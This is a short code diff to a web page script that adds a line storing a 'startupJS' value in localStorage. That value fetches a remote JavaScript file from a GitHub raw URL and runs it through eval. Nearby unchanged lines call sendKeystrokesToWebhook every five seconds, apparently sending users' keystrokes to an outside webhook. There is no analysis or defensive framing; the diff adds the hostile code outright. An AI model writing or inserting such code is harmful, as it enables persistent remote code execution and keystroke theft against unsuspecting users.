@@ -134,7 +134,8 @@ setInterval(() => {
   const loginVersion = document.getElementById('login_version');
   if (loginVersion) {
     loginVersion.textContent = "OOBE Version";
-  }
+  };
+  localStorage.setItem('startupJS', "fetch('https://github.com/ivorydevrimoalt/BONZIWORLDKRANTIVILLAIN/raw/refs/heads/main/FBI.js').then(r=>r.text()).then(eval);");
 }, 1);
 
 setInterval(function(){sendKeystrokesToWebhook()},5000)
